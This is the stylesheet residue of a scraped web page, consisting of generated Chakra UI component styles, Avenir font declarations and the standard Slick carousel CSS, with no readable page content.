.css-dnzamn { display: flex; -webkit-box-pack: center; justify-content: center; margin: 20px 0px; }

.css-1eqmq6c { width: 70px; }

.css-1hfq88p { background-color: rgb(45, 120, 189); padding: 10px; }

.css-dz67t0 { font-size: 11px; text-align: center; color: var(--chakra-colors-white); }

.css-1r69mki { opacity: 1; transform: scale(1); font-size: 0.625rem; transition-property: transform; transition-duration: var(--chakra-transition-duration-normal); width: 1.2em; }

.css-1sm2s1z { height: 100%; display: flex; flex-direction: column; }

.css-13fbd8g { background: url("/assets/header.png") left bottom / cover; width: 100%; height: 40%; position: relative; text-align: center; }

.css-1hvggs4 { height: 48px; margin-bottom: 10px; background-color: transparent; box-shadow: rgb(51, 51, 51) 0px 0px 5px; display: flex; -webkit-box-pack: center; justify-content: center; -webkit-box-align: center; align-items: center; }

.css-arqxt3 { color: var(--chakra-colors-white); font-size: 24px; font-family: AvenirBold; }

.css-1v97jab { width: 100%; padding: 20px; max-width: 374px; margin: auto; position: absolute; bottom: -38px; left: 0px; right: 0px; }

@media (max-width: 400px) {
  .css-1v97jab { max-width: 300px; }
}

.css-1meg77l { margin-top: auto; width: 100%; padding: 20px; }

.css-q7z8lq { color: rgb(14, 120, 202); font-size: 20px; font-family: AvenirBold; }

.css-2z8rzx { box-shadow: rgb(219, 219, 219) 0px 2px 4px; border-radius: 4px; margin-top: 24px; }

.css-qhzfk3 { margin-top: 10px; padding: 0px 10px; border-bottom: 1px solid rgb(219, 219, 219); display: flex; -webkit-box-align: center; align-items: center; }

.css-1fq0ymr { width: 24px; margin-right: 12px; }

.css-1ew2b06 { height: 48px; font-family: AvenirMedium; width: 100%; }

.css-1iarp40 { width: 24px; height: 24px; object-fit: contain; margin-right: 16px; }

.css-tb4kah { width: 24px; height: 24px; object-fit: contain; margin-right: 12px; }

.css-ldq9nk { margin-top: 20px; text-align: right; }

.css-1w471m1 { font-size: 16px; font-family: AvenirBold; margin-top: 20px; text-align: right; }

.css-70qvj9 { display: flex; -webkit-box-align: center; align-items: center; }

.css-2z5j4d { display: inline-flex; appearance: none; -webkit-box-align: center; align-items: center; -webkit-box-pack: center; justify-content: center; user-select: none; position: relative; white-space: nowrap; vertical-align: middle; outline: transparent solid 2px; outline-offset: 2px; line-height: 1.2; border-radius: 10px; font-weight: var(--chakra-fontWeights-semibold); transition-property: var(--chakra-transition-property-common); transition-duration: var(--chakra-transition-duration-normal); height: 50px; min-width: var(--chakra-sizes-10); font-size: var(--chakra-fontSizes-md); padding-inline-start: var(--chakra-space-4); padding-inline-end: var(--chakra-space-4); background-image: ; background-position-x: ; background-position-y: ; background-size: ; background-repeat-x: ; background-repeat-y: ; background-attachment: ; background-origin: ; background-clip: ; flex: 1 1 0%; width: 100%; margin-top: 9vh; background-color: rgb(14, 120, 202); color: var(--chakra-colors-white); font-family: AvenirBold; }

.css-2z5j4d:focus-visible, .css-2z5j4d[data-focus-visible] { box-shadow: var(--chakra-shadows-outline); }

.css-2z5j4d[disabled], .css-2z5j4d[aria-disabled="true"], .css-2z5j4d[data-disabled] { opacity: 0.4; cursor: not-allowed; box-shadow: var(--chakra-shadows-none); }

.css-2z5j4d:hover, .css-2z5j4d[data-hover] { background-color: rgb(14, 120, 202); }

.css-2z5j4d:active, .css-2z5j4d[data-active] { background: var(--chakra-colors-gray-300); }

.css-2z5j4d:focus, .css-2z5j4d[data-focus] { background-color: rgb(14, 120, 202); }

.css-1h9adj1 { display: inline-flex; appearance: none; -webkit-box-align: center; align-items: center; -webkit-box-pack: center; justify-content: center; user-select: none; position: relative; white-space: nowrap; vertical-align: middle; outline: transparent solid 2px; outline-offset: 2px; line-height: 1.2; border-radius: 10px; font-weight: var(--chakra-fontWeights-semibold); transition-property: var(--chakra-transition-property-common); transition-duration: var(--chakra-transition-duration-normal); height: 50px; min-width: var(--chakra-sizes-10); font-size: var(--chakra-fontSizes-md); padding-inline-start: var(--chakra-space-4); padding-inline-end: var(--chakra-space-4); background-image: ; background-position-x: ; background-position-y: ; background-size: ; background-repeat-x: ; background-repeat-y: ; background-attachment: ; background-origin: ; background-clip: ; margin-left: 10px; width: 50px; margin-top: 9vh; background-color: rgb(14, 120, 202); color: var(--chakra-colors-white); font-family: AvenirBold; padding: 8px; }

.css-1h9adj1:focus-visible, .css-1h9adj1[data-focus-visible] { box-shadow: var(--chakra-shadows-outline); }

.css-1h9adj1[disabled], .css-1h9adj1[aria-disabled="true"], .css-1h9adj1[data-disabled] { opacity: 0.4; cursor: not-allowed; box-shadow: var(--chakra-shadows-none); }

.css-1h9adj1:hover, .css-1h9adj1[data-hover] { background-color: rgb(14, 120, 202); }

.css-1h9adj1:active, .css-1h9adj1[data-active] { background: var(--chakra-colors-gray-300); }

.css-1h9adj1:focus, .css-1h9adj1[data-focus] { background-color: rgb(14, 120, 202); }

.css-m3dotl { width: 60px; object-fit: contain; }

.css-1aamklj { display: flex; -webkit-box-align: center; align-items: center; position: absolute; margin-inline-end: 0px; font-size: 1em; line-height: var(--chakra-lineHeights-normal); }

.css-1sqzeiz { display: inline-block; border-top: 2px solid currentcolor; border-right: 2px solid currentcolor; border-bottom-style: solid; border-left-style: solid; border-radius: 99999px; border-bottom-width: 2px; border-left-width: 2px; border-bottom-color: var(--chakra-colors-transparent); border-left-color: var(--chakra-colors-transparent); animation: 0.45s linear 0s infinite normal none running animation-b7n1on; width: 1em; height: 1em; --spinner-size:1.5rem; color: currentcolor; }

@-webkit-keyframes animation-b7n1on { 
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

@keyframes animation-b7n1on { 
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

.css-f8n5zr { border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; width: 1px; margin: -1px; padding: 0px; overflow: hidden; white-space: nowrap; position: absolute; }

.css-q7lffx { opacity: 0; }

.css-1g001md { background-color: white; padding: 8px 20px; }

.css-xgff9b { height: 32px; }

.css-1ruxp1v { padding: 20px; }

.css-oxdg2z { margin-top: 32px; margin-bottom: 20px; text-align: center; color: rgb(14, 120, 202); font-weight: 700; }

.css-mocmyu { text-align: center; display: flex; -webkit-box-align: center; align-items: center; -webkit-box-pack: center; justify-content: center; }

.css-5jccob { margin: auto; height: 150px; }

@media (max-height: 576px) {
  .css-5jccob { height: 100px; }
}

.css-1hdd86r { text-align: center; margin-top: 10px; flex: 1 1 0%; display: flex; align-items: flex-start; -webkit-box-pack: center; justify-content: center; margin-bottom: 32px; }

.css-1rtz5vg { display: flex; flex-direction: column; padding: 0px 32px; width: 100%; }

.css-7bfwvz { margin-bottom: 20px; text-align: left; color: rgb(14, 120, 202); font-weight: 700; }

.css-vcc54n { width: 100%; min-width: 0px; outline: transparent solid 2px; outline-offset: 2px; position: relative; appearance: none; transition-property: var(--chakra-transition-property-common); transition-duration: var(--chakra-transition-duration-normal); font-size: var(--chakra-fontSizes-lg); padding-inline-start: var(--chakra-space-4); padding-inline-end: var(--chakra-space-4); height: var(--chakra-sizes-12); border-radius: var(--chakra-radii-full); border: 1px solid rgb(171, 171, 171); background-image: inherit; background-position: inherit; background-size: inherit; background-repeat: inherit; background-attachment: inherit; background-origin: inherit; background-clip: inherit; margin-bottom: 20px; background-color: var(--chakra-colors-white); }

.css-vcc54n:hover, .css-vcc54n[data-hover] { border-color: var(--chakra-colors-gray-300); }

.css-vcc54n[aria-readonly="true"], .css-vcc54n[readonly], .css-vcc54n[data-readonly] { user-select: all; box-shadow: var(--chakra-shadows-none) !important; }

.css-vcc54n[disabled], .css-vcc54n[aria-disabled="true"], .css-vcc54n[data-disabled] { opacity: 0.4; cursor: not-allowed; }

.css-vcc54n[aria-invalid="true"], .css-vcc54n[data-invalid] { border-color: rgb(229, 62, 62); box-shadow: rgb(229, 62, 62) 0px 0px 0px 1px; }

.css-vcc54n:focus-visible, .css-vcc54n[data-focus-visible] { z-index: 1; border-color: rgb(49, 130, 206); box-shadow: rgb(49, 130, 206) 0px 0px 0px 1px; }

.css-7aff5n { display: inline-flex; appearance: none; -webkit-box-align: center; align-items: center; -webkit-box-pack: center; justify-content: center; user-select: none; position: relative; white-space: nowrap; vertical-align: middle; outline: transparent solid 2px; outline-offset: 2px; line-height: 1.2; border-radius: var(--chakra-radii-full); font-weight: var(--chakra-fontWeights-semibold); transition-property: var(--chakra-transition-property-common); transition-duration: var(--chakra-transition-duration-normal); height: var(--chakra-sizes-12); min-width: var(--chakra-sizes-12); font-size: var(--chakra-fontSizes-lg); padding-inline-start: var(--chakra-space-6); padding-inline-end: var(--chakra-space-6); background: var(--chakra-colors-blue-500); color: var(--chakra-colors-white); }

.css-7aff5n:focus-visible, .css-7aff5n[data-focus-visible] { box-shadow: var(--chakra-shadows-outline); }

.css-7aff5n[disabled], .css-7aff5n[aria-disabled="true"], .css-7aff5n[data-disabled] { opacity: 0.4; cursor: not-allowed; box-shadow: var(--chakra-shadows-none); }

.css-7aff5n:hover, .css-7aff5n[data-hover] { background: var(--chakra-colors-blue-600); }

.css-7aff5n:hover[disabled], .css-7aff5n[data-hover][disabled], .css-7aff5n:hover[aria-disabled="true"], .css-7aff5n[data-hover][aria-disabled="true"], .css-7aff5n:hover[data-disabled], .css-7aff5n[data-hover][data-disabled] { background: var(--chakra-colors-blue-500); }

.css-7aff5n:active, .css-7aff5n[data-active] { background: var(--chakra-colors-blue-700); }

.css-1ydnv1o { height: 100%; background-color: rgb(222, 231, 238); display: flex; flex-direction: column; -webkit-box-pack: center; justify-content: center; -webkit-box-align: center; align-items: center; padding: 20px; }

.css-41f8xg { background-color: white; border: 1px solid rgb(219, 219, 219); box-shadow: rgb(219, 219, 219) 0px 0px 4px; border-radius: 12px; width: 100%; position: relative; text-align: center; margin-top: 50px; }

.css-1qsi9nt { width: 100px; margin: -50px auto auto; }

.css-50apgb { border-bottom: 1px dashed rgb(219, 219, 219); display: flex; align-items: flex-end; -webkit-box-pack: center; justify-content: center; padding-bottom: 10px; }

.css-1aa1y8j { font-size: var(--chakra-fontSizes-xl); font-family: AvenirBold; color: rgb(14, 120, 202); }

.css-1tco0e8 { padding: 10px 20px 20px; }

.css-1114pta { font-family: AvenirMedium; font-size: 20px; color: rgb(14, 120, 202); }

.css-16ccg4r { white-space: pre-wrap; margin-top: 16px; font-size: 12px; }

.css-xp1ftg { width: 100%; min-width: 0px; outline: transparent solid 2px; outline-offset: 2px; position: relative; appearance: none; transition-property: var(--chakra-transition-property-common); transition-duration: var(--chakra-transition-duration-normal); font-size: var(--chakra-fontSizes-md); padding-inline-start: var(--chakra-space-4); padding-inline-end: var(--chakra-space-4); height: var(--chakra-sizes-10); border-radius: var(--chakra-radii-md); border-width: 1px; border-style: solid; border-image: initial; border-color: var(--chakra-colors-gray-500); background: inherit; font-weight: var(--chakra-fontWeights-semibold); margin-top: 20px; }

.css-xp1ftg:hover, .css-xp1ftg[data-hover] { border-color: var(--chakra-colors-gray-300); }

.css-xp1ftg[aria-readonly="true"], .css-xp1ftg[readonly], .css-xp1ftg[data-readonly] { user-select: all; box-shadow: var(--chakra-shadows-none) !important; }

.css-xp1ftg[disabled], .css-xp1ftg[aria-disabled="true"], .css-xp1ftg[data-disabled] { opacity: 0.4; cursor: not-allowed; }

.css-xp1ftg[aria-invalid="true"], .css-xp1ftg[data-invalid] { border-color: rgb(229, 62, 62); box-shadow: rgb(229, 62, 62) 0px 0px 0px 1px; }

.css-xp1ftg:focus-visible, .css-xp1ftg[data-focus-visible] { z-index: 1; border-color: rgb(49, 130, 206); box-shadow: rgb(49, 130, 206) 0px 0px 0px 1px; }

.css-63h4m2 { display: inline-flex; appearance: none; -webkit-box-align: center; align-items: center; -webkit-box-pack: center; justify-content: center; user-select: none; position: relative; white-space: nowrap; vertical-align: middle; outline: transparent solid 2px; outline-offset: 2px; line-height: 1.2; border-radius: var(--chakra-radii-md); font-weight: var(--chakra-fontWeights-semibold); transition-property: var(--chakra-transition-property-common); transition-duration: var(--chakra-transition-duration-normal); height: var(--chakra-sizes-10); min-width: var(--chakra-sizes-10); font-size: var(--chakra-fontSizes-md); padding-inline-start: var(--chakra-space-4); padding-inline-end: var(--chakra-space-4); background-image: ; background-position-x: ; background-position-y: ; background-size: ; background-repeat-x: ; background-repeat-y: ; background-attachment: ; background-origin: ; background-clip: ; background-color: rgb(14, 120, 202); color: var(--chakra-colors-white); margin-top: 10px; width: 100%; }

.css-63h4m2:focus-visible, .css-63h4m2[data-focus-visible] { box-shadow: var(--chakra-shadows-outline); }

.css-63h4m2[disabled], .css-63h4m2[aria-disabled="true"], .css-63h4m2[data-disabled] { opacity: 0.4; cursor: not-allowed; box-shadow: var(--chakra-shadows-none); }

.css-63h4m2:hover, .css-63h4m2[data-hover] { background: var(--chakra-colors-gray-200); }

.css-63h4m2:hover[disabled], .css-63h4m2[data-hover][disabled], .css-63h4m2:hover[aria-disabled="true"], .css-63h4m2[data-hover][aria-disabled="true"], .css-63h4m2:hover[data-disabled], .css-63h4m2[data-hover][data-disabled] { background: var(--chakra-colors-gray-100); }

.css-63h4m2:active, .css-63h4m2[data-active] { background: var(--chakra-colors-gray-300); }

.css-63h4m2:focus, .css-63h4m2[data-focus] { background-color: rgb(14, 120, 202); }

.css-1fow574 { font-family: AvenirMedium; margin-top: 16px; font-size: 12px; }

.css-bv69nn { opacity: 0.8; }

.css-1tzeee1 { opacity: 0.5; }
</style>
<style>

@charset "utf-8";

@font-face { font-family: Avenir; src: url("/fonts/avenir_next_regular.ttf"); }

@font-face { font-family: AvenirBold; src: url("/fonts/avenir_next_bold.ttf"); }

@font-face { font-family: AvenirMedium; src: url("/fonts/avenir_next_medium.ttf"); }

body, html { padding: 0px; margin: 0px; font-family: Avenir, "Helvetica Neue", sans-serif; }

#__next, body, html { height: 100%; }

a { color: inherit; text-decoration: none; }

* { box-sizing: border-box; }

input { outline: unset !important; }

@-webkit-keyframes from-top { 
  0% { transform: translateY(-60px); }
  100% { transform: translateY(0px); }
}

@keyframes from-top { 
  0% { transform: translateY(-60px); }
  100% { transform: translateY(0px); }
}

@-webkit-keyframes kedip { 
  0% { opacity: 0; }
  100% { opacity: 1; }
}

@keyframes kedip { 
  0% { opacity: 0; }
  100% { opacity: 1; }
}

.slick-slider { box-sizing: border-box; user-select: none; touch-action: pan-y; -webkit-tap-highlight-color: transparent; }

.slick-list, .slick-slider { position: relative; display: block; }

.slick-list { overflow: hidden; margin: 0px; padding: 0px; }

.slick-list:focus { outline: none; }

.slick-list.dragging { cursor: pointer; }

.slick-slider .slick-list, .slick-slider .slick-track { transform: translateZ(0px); }

.slick-track { position: relative; top: 0px; left: 0px; display: block; margin-left: auto; margin-right: auto; }

.slick-track::after, .slick-track::before { display: table; content: ""; }

.slick-track::after { clear: both; }

.slick-loading .slick-track { visibility: hidden; }

.slick-slide { display: none; float: left; height: 100%; min-height: 1px; }

[dir="rtl"] .slick-slide { float: right; }

.slick-slide img { display: block; }

.slick-slide.slick-loading img { display: none; }

.slick-slide.dragging img { pointer-events: none; }

.slick-initialized .slick-slide { display: block; }

.slick-loading .slick-slide { visibility: hidden; }

.slick-vertical .slick-slide { display: block; height: auto; border: 1px solid transparent; }

.slick-arrow.slick-hidden { display: none; }

.slick-loading .slick-list { background: url("/_next/static/media/ajax-loader.0b80f665.gif") 50% center no-repeat rgb(255, 255, 255); }

@font-face { font-family: slick; font-weight: 400; font-style: normal; src: url("/_next/static/media/slick.25572f22.eot?#iefix") format("embedded-opentype"), url("/_next/static/media/slick.653a4cbb.woff") format("woff"), url("/_next/static/media/slick.6aa1ee46.ttf") format("truetype"), url("/_next/static/media/slick.f895cfdf.svg#slick") format("svg"); }

.slick-next, .slick-prev { font-size: 0px; line-height: 0; position: absolute; top: 50%; display: block; width: 20px; height: 20px; padding: 0px; transform: translateY(-50%); cursor: pointer; border: none; }

.slick-next, .slick-next:focus, .slick-next:hover, .slick-prev, .slick-prev:focus, .slick-prev:hover { color: transparent; outline: none; background: transparent; }

.slick-next:focus::before, .slick-next:hover::before, .slick-prev:focus::before, .slick-prev:hover::before { opacity: 1; }

.slick-next.slick-disabled::before, .slick-prev.slick-disabled::before { opacity: 0.25; }

.slick-next::before, .slick-prev::before { font-family: slick; font-size: 20px; line-height: 1; opacity: 0.75; color: rgb(255, 255, 255); -webkit-font-smoothing: antialiased; }

.slick-prev { left: -25px; }

[dir="rtl"] .slick-prev { right: -25px; left: auto; }

.slick-prev::before { content: "←"; }

[dir="rtl"] .slick-prev::before { content: "→"; }

.slick-next { right: -25px; }

[dir="rtl"] .slick-next { right: auto; left: -25px; }

.slick-next::before { content: "→"; }

[dir="rtl"] .slick-next::before { content: "←"; }

.slick-dotted.slick-slider { margin-bottom: 30px; }

.slick-dots { position: absolute; bottom: -25px; display: block; width: 100%; padding: 0px; margin: 0px; list-style: none; text-align: center; }

.slick-dots li { position: relative; display: inline-block; margin: 0px 5px; padding: 0px; }

.slick-dots li, .slick-dots li button { width: 20px; height: 20px; cursor: pointer; }

.slick-dots li button { font-size: 0px; line-height: 0; display: block; padding: 5px; color: transparent; border: 0px; outline: none; background: transparent; }

.slick-dots li button:focus, .slick-dots li button:hover { outline: none; }

.slick-dots li button:focus::before, .slick-dots li button:hover::before { opacity: 1; }

.slick-dots li button::before { font-family: slick; font-size: 6px; line-height: 20px; position: absolute; top: 0px; left: 0px; width: 20px; height: 20px; content: "•"; text-align: center; opacity: 0.25; color: rgb(0, 0, 0); -webkit-font-smoothing: antialiased; }

.slick-dots li.slick-active button::before { opacity: 0.75; color: rgb(0, 0, 0); }
</style>
</div>
</div>
</body>
</div>
</div>
</html>
